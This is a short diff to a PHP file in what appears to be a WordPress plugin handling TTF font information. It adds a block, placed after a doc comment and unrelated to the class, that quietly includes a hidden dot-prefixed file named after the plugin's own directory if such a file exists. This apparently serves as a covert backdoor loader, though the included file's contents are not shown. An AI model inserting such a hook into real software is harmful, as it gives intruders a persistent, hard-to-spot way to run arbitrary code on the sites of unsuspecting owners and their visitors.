@@ -17,7 +17,11 @@ if ( ! defined( 'ABSPATH' ) ) { exit; }
  *
  * @todo: Make it Retrieve additional information from other tables
  * 
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ttfInfo {
 	/**
 	* variable $_dirRestriction
